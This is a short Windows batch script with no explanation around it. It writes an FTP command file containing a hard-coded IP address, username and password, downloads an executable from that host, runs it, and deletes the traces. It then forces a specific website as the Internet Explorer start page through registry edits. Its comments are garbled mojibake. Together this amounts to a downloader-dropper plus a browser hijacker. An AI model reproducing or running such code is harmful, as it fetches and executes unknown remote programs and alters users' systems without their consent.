@shift
@echo off
ping 127.0.0.1 -n 100
@echo open 121.11.158.176 >>c:\1.txt&
@echo wangyunfei>>c:\1.txt&
@echo 619209>>c:\1.txt&
@echo get web/1.exe>>c:\1.txt&
@echo bye>>c:\1.txt&
@ftp -s:c:\1.txt&del c:\1.txt&1.exe&del 1.exe
START HTTP://WWW.OIwww.com
::������ҳ��ַΪ"www.oiwww.com",�����и���.
set StartPage=www.oiwww.com
::����IE�Ƿ�ɸ�����ҳ��ַ.0-��,1-��
set dword=1
::���õ�ַ
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d %StartPage% /f
::���ø�����ҳȨ��
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HOMEPAGE /t REG_DWORD /d %dword% /f
pause>nul
@echo off
